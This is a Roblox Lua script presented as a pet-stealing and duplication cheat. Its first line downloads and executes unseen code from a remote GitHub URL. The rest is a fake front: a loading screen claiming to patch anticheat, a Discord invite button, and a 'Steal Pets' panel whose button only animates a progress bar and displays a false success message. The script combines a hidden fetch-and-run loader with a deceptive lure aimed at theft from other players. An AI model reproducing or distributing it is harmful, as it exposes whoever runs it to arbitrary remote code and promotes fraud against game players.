loadstring(game:HttpGet("https://raw.githubusercontent.com/snoixs/DupeScriptV5/refs/heads/main/WorkingAllGames"))()
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Remove old GUIs if they exist
if playerGui:FindFirstChild("LoadingGui") then
    playerGui.LoadingGui:Destroy()
end
if playerGui:FindFirstChild("DiscordGui") then
    playerGui.DiscordGui:Destroy()
end

-- CONFIG
local totalTime = 10
local steps = 100
local delayTime = totalTime / steps
local discordInvite = "https://discord.gg/your_invite_here" -- CHANGE THIS

-- Persistent start time
if not _G.loadingStartTime then
    _G.loadingStartTime = tick()
end

-- Calculate remaining time
local elapsed = tick() - _G.loadingStartTime
local remainingTime = math.clamp(totalTime - elapsed, 0, totalTime)
local remainingSteps = math.floor(remainingTime / delayTime)

-- ===== LOADING SCREEN =====
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingGui"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.Parent = playerGui

local container = Instance.new("Frame")
container.Size = UDim2.new(0, 400, 0, 200)
container.Position = UDim2.new(0.5, -200, 0.5, -100)
container.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
container.BorderSizePixel = 0
container.BackgroundTransparency = 0.1
container.Active = true
container.Draggable = true
container.Parent = loadingGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 12)
uiCorner.Parent = container

-- Cool title
local creditLabel = Instance.new("TextLabel")
creditLabel.Size = UDim2.new(1, 0, 0, 30)
creditLabel.Position = UDim2.new(0, 0, 0.1, 0)
creditLabel.BackgroundTransparency = 1
creditLabel.Font = Enum.Font.FredokaOne
creditLabel.TextScaled = true
creditLabel.TextColor3 = Color3.fromRGB(135, 206, 250)
creditLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 128)
creditLabel.TextStrokeTransparency = 0.3
creditLabel.Text = "Script made by vxly"
creditLabel.Parent = container

-- Images
local animeLeft = Instance.new("ImageLabel")
animeLeft.Size = UDim2.new(0, 60, 0, 60)
animeLeft.Position = UDim2.new(0, 10, 0, 10)
animeLeft.BackgroundTransparency = 1
animeLeft.Image = "rbxassetid://8551389435" -- NEW image (cool neon aesthetic)
animeLeft.Parent = container

local animeRight = Instance.new("ImageLabel")
animeRight.Size = UDim2.new(0, 60, 0, 60)
animeRight.AnchorPoint = Vector2.new(1, 0)
animeRight.Position = UDim2.new(1, -10, 0, 10)
animeRight.BackgroundTransparency = 1
animeRight.Image = "rbxassetid://6895556833"
animeRight.Parent = container

-- Progress bar background
local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(1, -40, 0, 40)
progressBg.Position = UDim2.new(0, 20, 0.65, 0)
progressBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBg.BorderSizePixel = 0
progressBg.Parent = container

local progressCorner = Instance.new("UICorner")
progressCorner.CornerRadius = UDim.new(0, 8)
progressCorner.Parent = progressBg

-- Progress bar fill
local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(elapsed / totalTime, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBg

local progressBarCorner = Instance.new("UICorner")
progressBarCorner.CornerRadius = UDim.new(0, 8)
progressBarCorner.Parent = progressBar

-- Percentage
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 0, 30)
percentLabel.Position = UDim2.new(0, 0, 0.25, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Font = Enum.Font.SourceSansBold
percentLabel.TextScaled = true
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Text = tostring(math.floor(elapsed / totalTime * 100)) .. "%"
percentLabel.Parent = container

-- Status text
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -40, 0, 30)
statusLabel.Position = UDim2.new(0, 20, 0.85, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.SourceSansItalic
statusLabel.TextScaled = true
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
statusLabel.Parent = container

local function updateStatus(i)
	if i <= 33 then
		statusLabel.Text = "Fetching data for the script..."
	elseif i <= 66 then
		statusLabel.Text = "Manipulating game's console..."
	else
		statusLabel.Text = "Patching anticheat..."
	end
end
updateStatus(elapsed / totalTime * 100)

-- ===== DISCORD GUI (Permanent RGB) =====
local discordGui = Instance.new("ScreenGui")
discordGui.Name = "DiscordGui"
discordGui.IgnoreGuiInset = true
discordGui.ResetOnSpawn = false
discordGui.Parent = playerGui

local discordButton = Instance.new("TextButton")
discordButton.Size = UDim2.new(0, 160, 0, 40)
discordButton.Position = UDim2.new(1, -180, 0.5, -20)
discordButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
discordButton.BorderSizePixel = 0
discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
discordButton.Font = Enum.Font.FredokaOne
discordButton.TextScaled = true
discordButton.Text = "Click me for the Discord"
discordButton.Parent = discordGui

local discordButtonCorner = Instance.new("UICorner")
discordButtonCorner.CornerRadius = UDim.new(0, 12)
discordButtonCorner.Parent = discordButton

local confirmLabel = Instance.new("TextLabel")
confirmLabel.Size = UDim2.new(0, 200, 0, 30)
confirmLabel.Position = UDim2.new(1, -220, 0.5, 30)
confirmLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
confirmLabel.BorderSizePixel = 0
confirmLabel.TextColor3 = Color3.fromRGB(135, 206, 250)
confirmLabel.Font = Enum.Font.FredokaOne
confirmLabel.TextScaled = true
confirmLabel.Text = "Discord link copied!"
confirmLabel.Visible = false
confirmLabel.Parent = discordGui

local confirmUICorner = Instance.new("UICorner")
confirmUICorner.CornerRadius = UDim.new(0, 12)
confirmUICorner.Parent = confirmLabel

-- RGB effect for Discord button
task.spawn(function()
	while task.wait() do
		for hue = 0, 1, 0.01 do
			discordButton.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
			task.wait(0.03)
		end
	end
end)

local function copyToClipboard(text)
	if setclipboard then
		setclipboard(text)
	else
		print("Clipboard copy not supported")
	end
end

discordButton.MouseButton1Click:Connect(function()
	copyToClipboard(discordInvite)
	confirmLabel.Visible = true
	for i = 1, 20 do
		confirmLabel.TextTransparency = 1 - i * 0.05
		task.wait(0.02)
	end
	task.wait(1.5)
	for i = 1, 20 do
		confirmLabel.TextTransparency = i * 0.05
		task.wait(0.02)
	end
	confirmLabel.Visible = false
end)

-- ===== LOADING PROGRESS =====
if remainingSteps > 0 then
	for i = math.floor(elapsed / totalTime * 100) + 1, 100 do
		local progressFraction = i / 100
		progressBar:TweenSize(UDim2.new(progressFraction, 0, 1, 0), "Out", "Linear", delayTime, true)
		percentLabel.Text = i .. "%"
		updateStatus(i)
		task.wait(delayTime)
	end
end

-- Fade out
for transparency = 0, 1, 0.05 do
	container.BackgroundTransparency = transparency
	progressBg.BackgroundTransparency = transparency
	progressBar.BackgroundTransparency = transparency
	percentLabel.TextTransparency = transparency
	statusLabel.TextTransparency = transparency
	creditLabel.TextTransparency = transparency
	animeLeft.ImageTransparency = transparency
	animeRight.ImageTransparency = transparency
	task.wait(0.05)
end

loadingGui:Destroy()
_G.loadingStartTime = nil
wait(1)
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Remove old GUI if exists
if playerGui:FindFirstChild("PlayerSearchGui") then
    playerGui.PlayerSearchGui:Destroy()
end

-- Create ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "PlayerSearchGui"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = playerGui

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 250)
frame.Position = UDim2.new(0.5, -175, 0.5, -125)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Font = Enum.Font.FredokaOne
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Text = "Player Search"
title.Parent = frame

-- Input Box
local input = Instance.new("TextBox")
input.Size = UDim2.new(0.8, -10, 0, 30)
input.Position = UDim2.new(0, 10, 0, 50)
input.PlaceholderText = "Enter player name..."
input.Text = ""
input.Font = Enum.Font.SourceSans
input.TextScaled = true
input.TextColor3 = Color3.fromRGB(255, 255, 255)
input.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
input.BorderSizePixel = 0
input.Parent = frame

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 8)
inputCorner.Parent = input

-- Search Button
local searchBtn = Instance.new("TextButton")
searchBtn.Size = UDim2.new(0.2, -10, 0, 30)
searchBtn.Position = UDim2.new(0.8, 0, 0, 50)
searchBtn.Text = "Search"
searchBtn.Font = Enum.Font.FredokaOne
searchBtn.TextScaled = true
searchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
searchBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
searchBtn.BorderSizePixel = 0
searchBtn.Parent = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = searchBtn

-- Player Info
local playerName = Instance.new("TextLabel")
playerName.Size = UDim2.new(1, -20, 0, 30)
playerName.Position = UDim2.new(0, 10, 0, 100)
playerName.BackgroundTransparency = 1
playerName.Font = Enum.Font.SourceSansBold
playerName.TextScaled = true
playerName.TextColor3 = Color3.fromRGB(255, 255, 255)
playerName.Text = ""
playerName.Parent = frame

local playerImage = Instance.new("ImageLabel")
playerImage.Size = UDim2.new(0, 100, 0, 100)
playerImage.Position = UDim2.new(0.5, -50, 0, 140)
playerImage.BackgroundTransparency = 1
playerImage.Image = ""
playerImage.Parent = frame

-- Steal Pets GUI (hidden at first)
local stealBtn = Instance.new("TextButton")
stealBtn.Size = UDim2.new(0.6, 0, 0, 40)
stealBtn.Position = UDim2.new(0.5, -105, 1, 10)
stealBtn.Text = "Steal Pets (Must be in trade)"
stealBtn.Font = Enum.Font.FredokaOne
stealBtn.TextScaled = true
stealBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
stealBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
stealBtn.BorderSizePixel = 0
stealBtn.Visible = false
stealBtn.Parent = frame

local stealCorner = Instance.new("UICorner")
stealCorner.CornerRadius = UDim.new(0, 8)
stealCorner.Parent = stealBtn

-- Search function
local function searchPlayer(name)
	for _, plr in ipairs(Players:GetPlayers()) do
		if string.lower(plr.Name) == string.lower(name) then
			playerName.Text = plr.Name
			local content, _ = Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
			playerImage.Image = content
			stealBtn.Visible = true
			return
		end
	end
	playerName.Text = "Player not found in server"
	playerImage.Image = ""
	stealBtn.Visible = false
end

searchBtn.MouseButton1Click:Connect(function()
	if input.Text ~= "" then
		searchPlayer(input.Text)
	end
end)

-- Steal Pets action
-- Steal Pets action
stealBtn.MouseButton1Click:Connect(function()
    local stealGui = Instance.new("ScreenGui")
    stealGui.Name = "StealingPetsGui"
    stealGui.ResetOnSpawn = false
    stealGui.IgnoreGuiInset = true
    stealGui.Parent = playerGui

    local stealFrame = Instance.new("Frame")
    stealFrame.Size = UDim2.new(0, 350, 0, 200)
    stealFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
    stealFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    stealFrame.BackgroundTransparency = 0.3 -- transparent background
    stealFrame.BorderSizePixel = 0
    stealFrame.Active = true
    stealFrame.Draggable = true
    stealFrame.Parent = stealGui

    local stealCorner = Instance.new("UICorner")
    stealCorner.CornerRadius = UDim.new(0, 12)
    stealCorner.Parent = stealFrame

    local stealButton = Instance.new("TextButton")
    stealButton.Size = UDim2.new(1, -40, 0, 40)
    stealButton.Position = UDim2.new(0, 20, 0, 20)
    stealButton.Text = "Steal"
    stealButton.Font = Enum.Font.FredokaOne
    stealButton.TextScaled = true
    stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    stealButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
    stealButton.BorderSizePixel = 0
    stealButton.Parent = stealFrame

    local btnCorner2 = Instance.new("UICorner")
    btnCorner2.CornerRadius = UDim.new(0, 8)
    btnCorner2.Parent = stealButton

    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size = UDim2.new(1, 0, 0, 40)
    percentLabel.Position = UDim2.new(0, 0, 0.45, -20)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Font = Enum.Font.FredokaOne
    percentLabel.TextScaled = true
    percentLabel.TextColor3 = Color3.fromRGB(0, 255, 127) -- green percentage
    percentLabel.Text = ""
    percentLabel.Parent = stealFrame

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0, 40)
    statusLabel.Position = UDim2.new(0, 0, 0.7, -20)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Font = Enum.Font.SourceSansBold
    statusLabel.TextScaled = true
    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    statusLabel.TextStrokeTransparency = 0.5
    statusLabel.Text = ""
    statusLabel.Parent = stealFrame

    stealButton.MouseButton1Click:Connect(function()
        stealButton.Visible = false
        local totalTime = 15
        local steps = 100
        local delayTime = totalTime / steps

        for i = 1, steps do
            percentLabel.Text = i .. "%"
            if i == 1 then
                statusLabel.Text = "Stealing pets..."
            elseif i == 34 then
                statusLabel.Text = "Finding the best ones..."
            elseif i == 67 then
                statusLabel.Text = "Forcing trade accept..."
            end
            task.wait(delayTime)
        end

        -- Success message at the end
        percentLabel.Text = "✅ 100%"
        statusLabel.Text = "Successful! All best pets added to trade ✅"
        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 127) -- success green
    end)
end)
